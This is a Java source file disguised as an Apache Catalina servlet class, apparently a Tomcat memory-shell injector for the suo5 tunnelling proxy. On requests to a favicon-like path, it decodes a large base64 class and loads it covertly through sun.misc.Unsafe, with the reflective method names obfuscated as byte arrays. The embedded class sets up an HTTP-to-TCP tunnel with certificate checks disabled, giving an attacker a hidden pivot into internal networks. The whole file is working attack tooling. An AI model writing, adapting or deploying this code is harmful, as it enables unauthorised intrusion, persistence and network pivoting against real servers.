package org.apache.catalina.servlets.sl;

public class Suo5 {
    private static final String pathPattern= "/faviconsuo";

    public static Class unsafedefine(byte[] bytes) throws Exception {
        java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
        field.setAccessible(true);
        Object unsafe = field.get(null);
        java.lang.reflect.Method m = sun.misc.Unsafe.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,65,110,111,110,121,109,111,117,115,67,108,97,115,115}), new Class[]{Class.class, byte[].class, Object[].class});
        m.setAccessible(true);
        Class clazz = (Class) m.invoke(unsafe, new Object[]{java.io.File.class, bytes, null});
        return clazz;
    }

    public static void doService(Object obj, String url, String method, java.io.InputStream in) {
        if (url.matches(pathPattern)) {
            java.util.Map objMap = (java.util.Map) obj;
            Object request = objMap.get("request");
            Object response = objMap.get("response");

            Object[] args = new Object[]{
                    request,
                    response
            };

            try {
                java.net.URLClassLoader loader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
                String clazzBase64 = "yv66vgAAADECDAoABgD2CQBpAPcJAGkA+AcA+QgA+gcA+wgA/AoAaQD9BwD+CAD/CAEACgAJAQEKAGkBAggBAwoAaQEECgBpAQUHAQYHAQcKABUBCAgBCQcBCgoAaQELCAEMBwENCgAYAQ4KABgBDwoAEgEQBwERCgAcAPYIARIKABwBEwgBFAgBFQkAaQEWCgAcARcKABwBGAcBGQcBGgoAJgD2CgAmARsIARwKACYBHQoAJgEeCgAlAR8KASABIQcBIgoALgD2CgAcASMLASQBJQcBJgoACQEnCgAuASgKAAkBKQoALgEOCgBpASoKAC4BKwoBLAEtCgEsAS4KASwBLwoBLAEwCgEsATEKASwBMgoBLAEzCgEsATQDAgAAAAcBNQgBNgoAQgEfCAE3CgASAR8KAGkBOAoACQE5CAE6CgBpATsIATwKAGkBPQgBPgoAWwE/CAFACAFBCAFCCAFDCAFECAFFCgBbAUYKAAYBRwgBSAcBSQoAWAFKCgFLAUwHAU0KAFsBTggBTwcBUAoAXgD2BwFRCgBgAVIKAF4BUwoAaQFUCgBpAVUKABgBVggBVwoAXgFYCgBeAVkHAVoKAGkBWwcBXAoAawFdCgBrAV4KAGkBXwoAXgFWCgBrAWAKABUBYQoAaQFiBwFjCgBzAWQIAWUIAWYIAWcKAGkBaAoAaQFpCgCSAWoKAGkBawoAaQFsCgCSAVkKAGkBbQoAaQFuCgBpAW8KAIQBcAsApAFxCwCkAXIHAXMKAIQBdAcBdQoAhgF2CgAJAXcKAAkBeAkBeQF6BwF7CgCLAR8KAIsBfAkAaQF9CgAcAX4IAX8KAIsBgAcBgQoAkgGCCAGDCQBbAYQKAFsBhQgBhgoAkgGHCgCSAYgHAYkKAFgBigoAmgGLCAGMCgGNAY4HAY8KAY0BkAoBjQGRCgCaAZIIAZMHAZQKAJIBlQoAkgFYCgCSAZYHAZcKAFgBmAcBmQkAqgGEBwGaCQCsAYQKAGkBmwoBSwGcCgFLAZ0KAGkBngcBnwcBoAcBoQEABWFkZHJzAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAA2N0eAEACWdJblN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEACmdPdXRTdHJlYW0BABZMamF2YS9pby9PdXRwdXRTdHJlYW07AQAGPGluaXQ+AQADKClWAQAEQ29kZQEALihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAhyZWFkRnVsbAEAGihMamF2YS9pby9JbnB1dFN0cmVhbTtbQilWAQAKRXhjZXB0aW9ucwcBogEADXRyeUZ1bGxEdXBsZXgBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAluZXdDcmVhdGUBABYoQilMamF2YS91dGlsL0hhc2hNYXA7AQAHbmV3RGF0YQEAFyhbQilMamF2YS91dGlsL0hhc2hNYXA7AQAGbmV3RGVsAQAVKClMamF2YS91dGlsL0hhc2hNYXA7AQAJbmV3U3RhdHVzAQAKdTMydG9CeXRlcwEABShJKVtCAQAKYnl0ZXNUb1UzMgEABShbQilJAQADcHV0AQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQADZ2V0AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZyZW1vdmUBAAtjb3B5T2ZSYW5nZQEACChbQklJKVtCAQAHbWFyc2hhbAEAFyhMamF2YS91dGlsL0hhc2hNYXA7KVtCAQAJdW5tYXJzaGFsAQAqKExqYXZhL2lvL0lucHV0U3RyZWFtOylMamF2YS91dGlsL0hhc2hNYXA7AQAOcHJvY2Vzc0RhdGFCaW8BAApyZWFkU29ja2V0AQAvKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2lvL091dHB1dFN0cmVhbTtaKVYBAAdyZWFkUmVxAQAQcHJvY2Vzc0RhdGFVbmFyeQEAA3J1bgEAC2NvbGxlY3RBZGRyAQALaXNMb2NhbEFkZHIBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAhyZWRpcmVjdAEAVShMamF2YS9sYW5nL09iamVjdDtMamF2YS91dGlsL0hhc2hNYXA7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbjsBAAZ2ZXJpZnkBAC8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L25ldC9zc2wvU1NMU2Vzc2lvbjspWgEAEmNoZWNrQ2xpZW50VHJ1c3RlZAEAOihbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7TGphdmEvbGFuZy9TdHJpbmc7KVYHAaMBABJjaGVja1NlcnZlclRydXN0ZWQBABJnZXRBY2NlcHRlZElzc3VlcnMBACcoKVtMamF2YS9zZWN1cml0eS9jZXJ0L1g1MDlDZXJ0aWZpY2F0ZTsBAAxpbnZva2VNZXRob2QBAEsoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA1pbnZva2VNZXRob2QyAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIPGNsaW5pdD4MALwAvQwAuAC5DAC6ALsBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL09iamVjdAEAClVzZXItQWdlbnQMAPEA8gEAEGphdmEvbGFuZy9TdHJpbmcBAAxDb250ZW50LVR5cGUBABFhcHBsaWNhdGlvbi9wbGFpbgwAwADBDADGAMcBABhhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0MAN4AxwwA4gDHAQATamF2YS9sYW5nL1Rocm93YWJsZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAaQBpQEADmdldElucHV0U3RyZWFtAQATamF2YS9pby9JbnB1dFN0cmVhbQwAwgDDAQAPZ2V0T3V0cHV0U3RyZWFtAQAUamF2YS9pby9PdXRwdXRTdHJlYW0MAaYBpwwBqAC9DAGpAL0BABFqYXZhL3V0aWwvSGFzaE1hcAEAAmFjDADTAaoBAAFzAQACZHQMALcAtgwA1QGrDADXAasBACJqYXZhL2xhbmcvSWxsZWdhbEFyZ3VtZW50RXhjZXB0aW9uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAawBrQEAAyA+IAwBrAGuDAGvAbAMALwBsQcBsgwBswG0AQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAbUBtgcBtwwBuAG5AQACW0IMAboBuwwBpgG8DAG9Ab4MAM8A0AwBvwG+BwHADAHBAcIMAcMBwgwA0wHEDADTAcUMAcYBvgwBxwHFDAHIAbsMANUByQEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAtpbnZhbGlkIGxlbgEADWtleSBsZW4gZXJyb3IMANgA2QwAvAGnAQAPdmFsdWUgbGVuIGVycm9yDADRANIBAAt2YWx1ZSBlcnJvcgwA3ADdAQAJc2V0U3RhdHVzDAHKAcsBAA1zZXRCdWZmZXJTaXplAQAJc2V0SGVhZGVyAQARWC1BY2NlbC1CdWZmZXJpbmcBAAJubwEAAWgBAAFwDAHMAc0MAc4BzwEADGdldExvY2FsUG9ydAEAD2phdmEvbGFuZy9DbGFzcwwBfwHQBwHRDAHSAdMBABFqYXZhL2xhbmcvSW50ZWdlcgwB1AG7AQANZ2V0U2VydmVyUG9ydAEAD2phdmEvbmV0L1NvY2tldAEAGmphdmEvbmV0L0luZXRTb2NrZXRBZGRyZXNzDAC8AdUMAdYB1wwAzgDJDADaANsMAdgAvQEAC2ZsdXNoQnVmZmVyDAEMAdkMAQkB2gEACnZzdW9zeXN0ZW0MALwAvwEAEGphdmEvbGFuZy9UaHJlYWQMALwB2wwB3AC9DADhAL8MAd0AvQwBpADSDADKAMsBABtqYXZhL2lvL0J1ZmZlcmVkSW5wdXRTdHJlYW0MALwB3gEAAmlkAQABcgEAAAwA5QDmDADnAOgMAd8AvQwA1QDWDADMAM0MANMA1AwA1wDWDADfAOAMAeAB4QwB4gHjDAHkAeUBABlqYXZhL25ldC9OZXR3b3JrSW50ZXJmYWNlDAHmAeEBABRqYXZhL25ldC9JbmV0QWRkcmVzcwwB5wGwDAHoAekMAeoB6wcB7AwB7QHuAQAMamF2YS9uZXQvVVJMDAHvAbAMALUAtgwB8ADBAQAJZ2V0TWV0aG9kDAHxAfIBABpqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbgwB8wGxAQARc2V0Q29ubmVjdFRpbWVvdXQMAfQB9QwAvAG8AQAOc2V0UmVhZFRpbWVvdXQMAfYB9wwB+AH3AQAgamF2YXgvbmV0L3NzbC9IdHRwc1VSTENvbm5lY3Rpb24MAfkAwQwB+gH7AQADU1NMBwH8DAH9Af4BABpqYXZheC9uZXQvc3NsL1RydXN0TWFuYWdlcgwB/wIADAIBAgIMAgMCBAEADmdldEhlYWRlck5hbWVzAQAVamF2YS91dGlsL0VudW1lcmF0aW9uDAIFAgYMAgcBuwEAImphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGUMAggCCQEADmphdmEvbGFuZy9Mb25nAQAPamF2YS9sYW5nL1Nob3J0DADzAPQMAgoB4wwCCwH3DADkAM0BABJqYXZhL2xhbmcvUnVubmFibGUBAB5qYXZheC9uZXQvc3NsL0hvc3RuYW1lVmVyaWZpZXIBAB5qYXZheC9uZXQvc3NsL1g1MDlUcnVzdE1hbmFnZXIBAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BACdqYXZhL3NlY3VyaXR5L2NlcnQvQ2VydGlmaWNhdGVFeGNlcHRpb24BAARyZWFkAQAHKFtCSUkpSQEABXdyaXRlAQAFKFtCKVYBAAVmbHVzaAEAD3ByaW50U3RhY2tUcmFjZQEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBABwoSSlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADmphdmEvbGFuZy9NYXRoAQADbWluAQAFKElJKUkBAAZrZXlTZXQBABEoKUxqYXZhL3V0aWwvU2V0OwEADWphdmEvdXRpbC9TZXQBAAd0b0FycmF5AQAVKClbTGphdmEvbGFuZy9PYmplY3Q7AQAGbGVuZ3RoAQADKClJAQAEKEkpVgEACGdldEJ5dGVzAQAEKClbQgEAC3RvQnl0ZUFycmF5AQATamF2YS9uaW8vQnl0ZUJ1ZmZlcgEACGFsbG9jYXRlAQAYKEkpTGphdmEvbmlvL0J5dGVCdWZmZXI7AQAGcHV0SW50AQAYKEIpTGphdmEvbmlvL0J5dGVCdWZmZXI7AQAZKFtCKUxqYXZhL25pby9CeXRlQnVmZmVyOwEABWFycmF5AQAEd3JhcAEABmdldEludAEAAygpQgEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIaW50VmFsdWUBABYoTGphdmEvbGFuZy9TdHJpbmc7SSlWAQAHY29ubmVjdAEAHChMamF2YS9uZXQvU29ja2V0QWRkcmVzcztJKVYBAAVjbG9zZQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAXKExqYXZhL2xhbmcvUnVubmFibGU7KVYBAAVzdGFydAEABGpvaW4BABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAApkaXNjb25uZWN0AQAUZ2V0TmV0d29ya0ludGVyZmFjZXMBABkoKUxqYXZhL3V0aWwvRW51bWVyYXRpb247AQAPaGFzTW9yZUVsZW1lbnRzAQADKClaAQALbmV4dEVsZW1lbnQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldEluZXRBZGRyZXNzZXMBAA5nZXRIb3N0QWRkcmVzcwEAB2luZGV4T2YBAAQoSSlJAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9Cb29sZWFuAQAEVFJVRQEAE0xqYXZhL2xhbmcvQm9vbGVhbjsBAAdnZXRIb3N0AQALY29udGFpbnNLZXkBAA5vcGVuQ29ubmVjdGlvbgEAGigpTGphdmEvbmV0L1VSTENvbm5lY3Rpb247AQAQc2V0UmVxdWVzdE1ldGhvZAEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEAC3NldERvT3V0cHV0AQAEKFopVgEACnNldERvSW5wdXQBAAppc0luc3RhbmNlAQATc2V0SG9zdG5hbWVWZXJpZmllcgEAIyhMamF2YXgvbmV0L3NzbC9Ib3N0bmFtZVZlcmlmaWVyOylWAQAYamF2YXgvbmV0L3NzbC9TU0xDb250ZXh0AQALZ2V0SW5zdGFuY2UBAC4oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9uZXQvc3NsL1NTTENvbnRleHQ7AQAEaW5pdAEAVyhbTGphdmF4L25ldC9zc2wvS2V5TWFuYWdlcjtbTGphdmF4L25ldC9zc2wvVHJ1c3RNYW5hZ2VyO0xqYXZhL3NlY3VyaXR5L1NlY3VyZVJhbmRvbTspVgEAEGdldFNvY2tldEZhY3RvcnkBACIoKUxqYXZheC9uZXQvc3NsL1NTTFNvY2tldEZhY3Rvcnk7AQATc2V0U1NMU29ja2V0RmFjdG9yeQEAIyhMamF2YXgvbmV0L3NzbC9TU0xTb2NrZXRGYWN0b3J5OylWAQASc2V0UmVxdWVzdFByb3BlcnR5AQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAPZ2V0UmVzcG9uc2VDb2RlAQAQaXNBc3NpZ25hYmxlRnJvbQEAFChMamF2YS9sYW5nL0NsYXNzOylaAQAMaXNBY2Nlc3NpYmxlAQANc2V0QWNjZXNzaWJsZQAhAGkABgADALIAswC0AAQACQC1ALYAAAAJALcAtgAAAAAAuAC5AAAAAAC6ALsAAAAgAAEAvAC9AAEAvgAAABEAAQABAAAABSq3AAGxAAAAAAABALwAvwABAL4AAAAbAAIAAwAAAA8qtwABKiu1AAIqLLUAA7EAAAAAAAEAwADBAAEAvgAAAK4ABgAIAAAAeivAAATAAARNLAMyTiwEMjoELRIFBL0ABlkDEgdTuAAIwAAJOgUtEgUEvQAGWQMSClO4AAjAAAk6BhkGxwAFA6wZBhILtgAMmQAMKi0ZBLYADQSsGQYSDrYADJkADSotGQS3AA+nAAoqLRkEtwAQpwAFOgenAAU6BQSsAAUAQABSAHEAEQBTAG4AcQARABEAPwB2ABIAQABSAHYAEgBTAHMAdgASAAAAAQDCAMMAAgC+AAAANgAEAAYAAAAqAz4dLL6iACQsvh1kNgQrLB0VBLYAEzYFFQUCoAAGpwALHRUFYD6n/9yxAAAAAADEAAAABgACAEIAxQABAMYAxwACAL4AAABXAAMABgAAAEMBTisSFAO9AAa4AAjAABVOECC8CDoEKi0ZBLYAFiwSFwO9AAa4AAjAABg6BRkFGQS2ABkZBbYAGqcACjoEGQS2ABuxAAEAAgA4ADsAEgAAAMQAAAAGAAIAQgDFAAIAyADJAAEAvgAAADIABgADAAAAJrsAHFm3AB1NLBIeBLwIWQMHVLYAH1csEiAEvAhZAxtUtgAfVyywAAAAAAACAMoAywABAL4AAAAsAAYAAwAAACC7ABxZtwAdTSwSHgS8CFkDBFS2AB9XLBIhK7YAH1cssAAAAAAAAgDMAM0AAQC+AAAAJAAGAAIAAAAYuwAcWbcAHUwrEh4EvAhZAwVUtgAfVyuwAAAAAAACAM4AyQABAL4AAAAkAAYAAwAAABi7ABxZtwAdTSwSIAS8CFkDG1S2AB9XLLAAAAAAAAAAzwDQAAEAvgAAAC8ABAADAAAAIwe8CE0sAxsQGHqRVCwEGxAQepFULAUbEAh6kVQsBhuRVCywAAAAAAAAANEA0gABAL4AAAA3AAMAAgAAACsrAzMRAP9+EBh4KwQzEQD/fhAQeIArBTMRAP9+EAh4gCsGMxEA/34DeICsAAAAAAAgANMA1AABAL4AAAAWAAMAAwAAAAqyACIrLLYAH1exAAAAAAAgANUA1gABAL4AAAAUAAIAAgAAAAiyACIrtgAjsAAAAAAAIADXANYAAQC+AAAAFAACAAIAAAAIsgAiK7YAJLAAAAAAAAAA2ADZAAEAvgAAAGQABQAIAAAAWB0cZDYEFQScACK7ACVZuwAmWbcAJxy2ACgSKbYAKh22ACi2ACu3ACy/FQS8CDoFK74cZBUEuAAtNgYDNgcVBxUGogAUGQUVByscFQdgM1SEBwGn/+sZBbAAAAAAAAIA2gDbAAIAvgAAAMEABAAIAAAAtbsALlm3AC9NK7YAMLkAMQEATgM2BBUELb6iAEQtFQQywAAJOgUrGQW2ACPAADLAADI6BiwZBbYAM5G2ADQsGQW2ADW2ADYsKhkGvrYAN7YANiwZBrYANoQEAaf/uyy2ADg6BAgZBL5guAA5OgUZBRkEvrYAOlcZBBkEvgVsMzYGGQUVBrYAO1cDNgcVBxkEvqIAFxkEFQcZBBUHMxUGgpFUhAcBp//nGQUZBLYAPFcZBbYAPbAAAAAAAMQAAAAEAAEAQgACANwA3QACAL4AAAFBAAUADgAAATUIvAhNKisstgAWLLgAPk4ttgA/NgQttgBANgUVBBJBpAANuwBCWRJDtwBEvxUEvAg6BiorGQa2ABYDNgcVBxkGvqIAFxkGFQcZBhUHMxUFgpFUhAcBp//nuwAcWbcAHToHAzYJFQkZBr4EZKIAxxkGFQkzkzYKhAkBFQkVCmAZBr6hAA27ABJZEkW3AEa/FQqcAA27ABJZEkW3AEa/KhkGFQkVCRUKYLYARzoIuwAJWRkItwBIOgsVCRUKYDYJFQkHYBkGvqEADbsAElkSSbcARr8qGQYVCRUJB2C2AEc6CCoZCLYASjYMhAkEFQycAA27ABJZEku3AEa/FQkVDGAZBr6kAA27ABJZEku3AEa/KhkGFQkVCRUMYLYARzoNFQkVDGA2CRkHGQsZDbYAH1en/zUZB7AAAAAAAMQAAAAEAAEAEgACAN4AxwACAL4AAAIFAAYADQAAAckrEhQDvQAGuAAIwAAVTiottwBMOgQZBBIetgAjwAAywAAyOgUZBb4EoAAKGQUDM5kAGCwSTQS9AAZZAxEBk7gATlO4AAhXsSwSTwS9AAZZAxECALgATlO4AAhXLBIXA70ABrgACMAAGDoGLBJQBb0ABlkDElFTWQQSUlO4AAhXuwAJWRkEElO2ACPAADLAADK3AEg6CLsACVkZBBJUtgAjwAAywAAytwBIuABVNgkVCZoAQiu2AFYSVwO9AFi2AFkrA70ABrYAWsAAW7YAXDYJpwAiOgortgBWEl0DvQBYtgBZKwO9AAa2AFrAAFu2AFw2CbsAXlm3AF86BxkHuwBgWRkIFQm3AGERE4i2AGKnAB46CBkGKioEtwBjtwBktgAZGQa2ABoZBrYAZbEZBioqA7cAY7cAZLYAGRkGtgAaLBJmA70ABrgACFcZB7YAZzoIGQe2AGg6CQE6CrsAaVkZCRkGtwBqOgu7AGtZGQu3AGw6ChkKtgBtKi0ZCLcAbhkHtgBvGQa2AGUZCsYAPRkKtgBwpwA1OgsZB7YAbxkGtgBlGQrGACQZCrYAcKcAHDoMGQe2AG8ZBrYAZRkKxgAIGQq2AHAZDL+xAAYAswDQANMAEgB/AQ4BEQASAVsBfwGWABIBWwF/Aa8AAAGWAZgBrwAAAa8BsQGvAAAAAADEAAAABAABABIAAgDfAOAAAgC+AAAATgAFAAcAAABCESAAvAg6BCsZBLYAcTYFFQWdAAanAC0qGQQDAxUFYLYARzoGHZkADyoqGQa3AHK3AGQ6BiwZBrYAGSy2ABqn/8mxAAAAAADEAAAABAABAEIAAgDhAL8AAgC+AAAAbQACAAcAAABhKiu3AExOLRIetgAjwAAywAAyOgQZBL4EnwAEsRkEAzM2BRUFBaAACCy2AGWxFQUEoAAkLRIhtgAjwAAywAAyOgYZBr6ZAA0sGQa2ABkstgAapwANFQUGoAAGp/+msaf/ogAAAAAAxAAAAAQAAQASAAIA4gDHAAIAvgAAA04ABgAUAAADEisSFAO9AAa4AAjAABVOuwBzWS23AHQ6BCoZBLcATDoFuwAJWRkFEnW2ACPAADLAADK3AEg6BhkFEh62ACPAADLAADI6BxkHvgSfABgsEk0EvQAGWQMRAZO4AE5TuAAIV7EZBwMzNggZBRJ2tgAjwAAywAAyOgkZCcYADRkJvp4ABwSnAAQDNgoSdzoLFQqZACYZBRJ2tgAkV7sACVkZCbcASDoLKhkLtgB4mgAHBKcABAM2ChUKmQAgFQgEoQAaFQgGowAUKisZBRkLtgB5OgwZDLYAerEsEk8EvQAGWQMRAgC4AE5TuAAIVywSFwO9AAa4AAjAABg6DBUIBaAAHioZBrYAezoNGQ3HAASxGQ3AABg6DhkOtgBlsRUIBKAAVioZBrYAezoNGQ3HABsZDCoqtwB8twBktgAZGQy2ABoZDLYAZbEZDcAAGDoOGQUSIbYAI8AAMsAAMjoPGQ++mQAPGQ4ZD7YAGRkOtgAaGQy2AGWxFQiZAASxLBJQBb0ABlkDElFTWQQSUlO4AAhXuwAJWRkFElO2ACPAADLAADK3AEg6DbsACVkZBRJUtgAjwAAywAAytwBIuABVNg4VDpoAQiu2AFYSVwO9AFi2AFkrA70ABrYAWsAAW7YAXDYOpwAiOg8rtgBWEl0DvQBYtgBZKwO9AAa2AFrAAFu2AFw2DgE6EAE6ERUKmQAYKisZBRkLtgB5OhEZEbYAfToPpwB0uwBeWbcAXzoQGRC7AGBZGQ0VDrcAYRETiLYAYhkQtgBoOg8qGQYZELYAZ7YAfhkMKioDtwBjtwBktgAZGQy2ABosEmYDvQAGuAAIV6cAJToSKhkGtgB/VxkMKioEtwBjtwBktgAZGQy2ABoZDLYAZbEqGQ8ZDBUKmgAHBKcABAO3AIAZEMYACBkQtgBvGRHGAAgZEbYAehkMtgBlKhkGtgB/V6cATToSGRDGAAgZELYAbxkRxgAIGRG2AHoZDLYAZSoZBrYAf1enACg6ExkQxgAIGRC2AG8ZEcYACBkRtgB6GQy2AGUqGQa2AH9XGRO/sQAGAcIB3wHiABICIQJtAnAAEgKSAqQCxwASApICpALsAAACxwLJAuwAAALsAu4C7AAAAAAAxAAAAAQAAQASAAEA4wC9AAEAvgAAACYABAACAAAAEioqtAACKrQAAwS3AICnAARMsQABAAAADQAQABIAAAAIAOQAzQABAL4AAACHAAMABwAAAHO7ABxZtwAdS7gAgUwruQCCAQCZAFsruQCDAQDAAIRNLLYAhU4tuQCCAQCZAEAtuQCDAQDAAIY6BBkEtgCHOgUZBcYAJhkFECW2AIg2BhUGAp8ADRkFAxUGtgCJOgUqGQWyAIq2AB9Xp/+9p/+ipwAETCqwAAEACABtAHAAEgAAAAAA5QDmAAIAvgAAACAAAwADAAAAFLsAi1krtwCMtgCNTbIAjiy2AI+sAAAAAADEAAAABAABABIAAADnAOgAAgC+AAABPgAIAAkAAAEqKxKQA70ABrgACMAACToEuwCLWS23AIw6BRkFtgCRwACSOgYZBhkEtgCTGQa2AFYSlAS9AFhZA7IAlVO2AFkZBgS9AAZZA7sAW1kRC7i3AJZTtgBaVxkGtgBWEpcEvQBYWQOyAJVTtgBZGQYEvQAGWQO7AFtZA7cAllO2AFpXpwAFOgcZBgS2AJgZBgS2AJkSmhkGtgCbmQAvGQbAAJoqtgCcEp24AJ46BxkHAQS9AJ9ZAypTAbYAoBkGwACaGQe2AKG2AKIrEqMDvQAGuAAIwACkOgcZB7kAggEAmQArGQe5AIMBAMAACToIGQYZCCsSBQS9AAZZAxkIU7gACMAACbYApaf/0RkGtgCmOggZCCostwBktgAZGQi2ABoZCLYAZRkGtgCnVxkGsAABACoAfgCBABIAAADEAAAABAABABIAAQDpAOoAAQC+AAAADgABAAMAAAACBKwAAAAAAAEA6wDsAAIAvgAAAA0AAAADAAAAAbEAAAAAAMQAAAAEAAEA7QABAO4A7AACAL4AAAANAAAAAwAAAAGxAAAAAADEAAAABAABAO0AAQDvAPAAAQC+AAAAEQABAAEAAAAFA70AqLAAAAAAAAkA8QDyAAIAvgAAAGwABAAGAAAAYCy+vQBYTgM2BBUELL6iAEssFQQytgBWOgUSWxkFtgCpmQALsgCVOgWnACQSqhkFtgCpmQALsgCrOgWnABISrBkFtgCpmQAIsgCtOgUtFQQZBVOEBAGn/7QqKy0suACusAAAAAAAxAAAAAQAAQASAAkA8wD0AAIAvgAAADEAAwAGAAAAJSq2AFY6BBkEKyy2AFk6BRkFtgCvmgAJGQUEtgCwGQUqLbYAWrAAAAAAAMQAAAAEAAEAEgAIAPUAvQABAL4AAAAdAAIAAAAAABG4ALGzAI67ABxZtwAdswAisQAAAAAAAA==";
                byte[] clazzByte;
                try {
                    Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
                    Object Decoder = Base64.newInstance();
                    clazzByte=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{(clazzBase64)});
                } catch (Throwable ex)
                {
                    Class Base64 = loader.loadClass("java.util.Base64");
                    Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
                    clazzByte=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{clazzBase64});
                }

                Class clazz = unsafedefine(clazzByte);
                clazz.newInstance().equals(args);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

//    public static void main(String[] args) {
//        String classname = "vsuosystem.class";
//        byte[] code = new byte[0];
//        try {
//            code = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("/Users/joker/IdeaProjects/veo/vagent/src/main/java/org/apache/catalina/servlets/classs/"+classname));
//            System.out.println(java.util.Arrays.toString(code));
//            String b64bytecode = new String(org.apache.tomcat.util.codec.binary.Base64.encodeBase64(code));
//            String result = java.net.URLEncoder.encode(b64bytecode, "UTF-8");
//            System.out.println(result);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//
//        ClassLoader loader = Suo5.class.getClassLoader();
//        String clazzBase64 = "";
//        byte[] clazzByte;
//        try {
//            try {
//                Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
//                Object Decoder = Base64.newInstance();
//                clazzByte=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{(clazzBase64)});
//            } catch (Throwable ex)
//            {
//                Class Base64 = loader.loadClass("java.util.Base64");
//                Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
//                clazzByte=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{clazzBase64});
//            }
//
//            System.out.println(java.util.Arrays.toString(clazzByte));
//        }catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
}
